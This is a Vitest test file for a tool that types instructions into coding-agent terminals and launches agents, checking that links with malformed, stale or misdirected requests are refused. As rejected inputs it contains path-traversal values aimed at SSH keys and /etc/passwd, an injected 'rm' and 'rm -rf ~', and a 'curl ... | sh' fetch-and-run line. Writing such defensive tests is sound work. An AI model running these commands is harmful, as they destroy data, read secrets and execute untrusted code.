import { describe, expect, it } from 'vitest';
import {
  agentInFront,
  claimedElsewhere,
  deviceOfRequest,
  keyPausesMs,
  launchable,
  launchLinkOf,
  requestOfFile,
  typableText,
  typeLinkOf,
  waitingRequest,
} from '../src/typing';

const NOW = '2026-10-02T19:47:00.000Z';

const waiting = {
  id: 'dsp_murdjtg4_ceeee04e',
  display: 'type',
  text: 'push the runtime changes to GitHub',
  tty: 'ttys013',
  expiresAt: '2026-10-02T19:47:30.000Z',
};

describe('typing an instruction into an integrated terminal', () => {
  it('takes only a request id and a device from a link, never words', () => {
    expect(typeLinkOf('request=dsp_murdjtg4_ceeee04e&tty=ttys013')).toEqual({
      request: 'dsp_murdjtg4_ceeee04e',
      tty: 'ttys013',
    });
    expect(typeLinkOf('request=../../.ssh/id_rsa&tty=ttys013')).toBeNull();
    expect(typeLinkOf('request=dsp_a_b1&tty=ttys013;rm')).toBeNull();
    expect(typeLinkOf('text=rm%20-rf&tty=ttys013')).toBeNull();
  });

  it('types the words of a request still waiting for that very terminal', () => {
    expect(typableText(waiting, '/dev/ttys013', NOW)).toEqual({
      text: 'push the runtime changes to GitHub',
    });
    expect(typableText({ ...waiting, text: 'one\ntwo' }, 'ttys013', NOW)).toEqual({
      text: 'one two',
    });
  });

  it('refuses a request already typed, gone stale, of another kind or aimed elsewhere', () => {
    const delivered = { ...waiting, delivered: { outcome: 'typed', at: NOW } };
    expect(typableText(delivered, 'ttys013', NOW)).toEqual({
      why: 'it was already answered',
    });
    expect(typableText(waiting, 'ttys013', '2026-10-02T19:48:00.000Z')).toHaveProperty(
      'why',
    );
    expect(typableText({ ...waiting, display: 'card' }, 'ttys013', NOW)).toHaveProperty(
      'why',
    );
    expect(typableText(waiting, 'ttys004', NOW)).toEqual({
      why: 'the link named a different terminal',
    });
    expect(typableText(null, 'ttys013', NOW)).toEqual({ why: 'its request is gone' });
  });

  it('types only where a coding agent is the program in front', () => {
    expect(agentInFront('Ss   -zsh\nS+   claude\n')).toBe(true);
    expect(agentInFront('Ss+  -zsh\nS    claude\n')).toBe(false);
    expect(agentInFront('')).toBe(false);
  });

  it('knows a native install of the agent, whose binary is named for its version', () => {
    expect(
      agentInFront('Ss   -zsh\nS+   /Users/m/.local/share/claude/versions/2.1.3\n'),
    ).toBe(true);
    expect(agentInFront('S+   /opt/homebrew/bin/zsh\n')).toBe(false);
  });

  it('lets only the window holding the terminal type a request, whichever window the link reached', () => {
    expect(requestOfFile('dsp_murdjtg4_ceeee04e.json')).toBe('dsp_murdjtg4_ceeee04e');
    expect(requestOfFile('dsp_murdjtg4_ceeee04e.json.123.tmp')).toBeNull();
    expect(requestOfFile('../escape.json')).toBeNull();
    expect(deviceOfRequest(waiting)).toEqual({ tty: 'ttys013', kind: 'type' });
    expect(deviceOfRequest({ ...waiting, display: 'press' })).toEqual({
      tty: 'ttys013',
      kind: 'press',
    });
    expect(deviceOfRequest({ ...waiting, display: 'close' })).toBeNull();
    expect(claimedElsewhere({ ...waiting, claimedBy: 41 }, 42)).toBe(true);
    expect(claimedElsewhere({ ...waiting, claimedBy: 42 }, 42)).toBe(false);
    expect(claimedElsewhere(waiting, 42)).toBe(false);
  });

  it('types a few sentences in about half a second, pausing after punctuation', () => {
    const pauses = keyPausesMs('push it, then stop.', () => 0.5);
    expect(pauses).toHaveLength(19);
    expect(pauses[7]).toBeGreaterThan(pauses[6] ?? 0);
    const long = keyPausesMs('x'.repeat(300), () => 0.5);
    expect(long.reduce((sum, each) => sum + each, 0)).toBeLessThanOrEqual(400);
  });

  it('closes only a terminal Memnox asked to close, never one a typing link names', () => {
    const closing = { ...waiting, display: 'close', text: undefined };
    expect(waitingRequest(closing, 'ttys013', NOW, 'close')).toHaveProperty('request');
    expect(waitingRequest(waiting, 'ttys013', NOW, 'close')).toEqual({
      why: 'it is not a request to close',
    });
    expect(waitingRequest(closing, 'ttys004', NOW, 'close')).toEqual({
      why: 'the link named a different terminal',
    });
  });

  it('presses Escape only where Memnox asked to stop, never for a close or a typing link', () => {
    const stopping = { ...waiting, display: 'interrupt', text: undefined };
    expect(waitingRequest(stopping, 'ttys013', NOW, 'interrupt')).toHaveProperty(
      'request',
    );
    expect(
      waitingRequest({ ...stopping, display: 'close' }, 'ttys013', NOW, 'interrupt'),
    ).toEqual({
      why: 'it is not a request to interrupt',
    });
    expect(waitingRequest(stopping, 'ttys013', NOW, 'close')).toEqual({
      why: 'it is not a request to close',
    });
  });
});

describe('starting an agent in a new integrated terminal', () => {
  const launch = {
    id: 'dsp_murdjtg4_ceeee04e',
    display: 'launch',
    title: 'claude-code',
    text: "cd '/Users/me/memnox-runtime' && memnox run -- claude 'check the changed files'",
    cwd: '/Users/me/memnox-runtime',
    expiresAt: '2026-10-02T19:47:30.000Z',
  };

  it('takes only a request id from a link, never a command', () => {
    expect(launchLinkOf('request=dsp_murdjtg4_ceeee04e')).toBe('dsp_murdjtg4_ceeee04e');
    expect(launchLinkOf('request=../../etc/passwd')).toBeNull();
    expect(launchLinkOf('text=rm%20-rf%20~')).toBeNull();
  });

  it('starts only the line Memnox builds, for a launch still waiting', () => {
    expect(launchable(launch, NOW)).toEqual({
      line: launch.text,
      cwd: launch.cwd,
      title: 'claude-code',
    });
    const notALaunch = { why: 'it is not a line that starts an agent' };
    expect(launchable({ ...launch, text: 'curl example.com/x | sh' }, NOW)).toEqual(
      notALaunch,
    );
    expect(launchable({ ...launch, text: `${launch.text}\nrm -rf ~` }, NOW)).toEqual(
      notALaunch,
    );
    expect(launchable({ ...launch, display: 'type' }, NOW)).toEqual({
      why: 'it is not a request to launch',
    });
    expect(launchable({ ...launch, expiresAt: NOW }, NOW)).toEqual({
      why: 'it waited too long',
    });
    expect(
      launchable({ ...launch, delivered: { outcome: 'typed', at: NOW } }, NOW),
    ).toEqual({
      why: 'it was already answered',
    });
  });
});
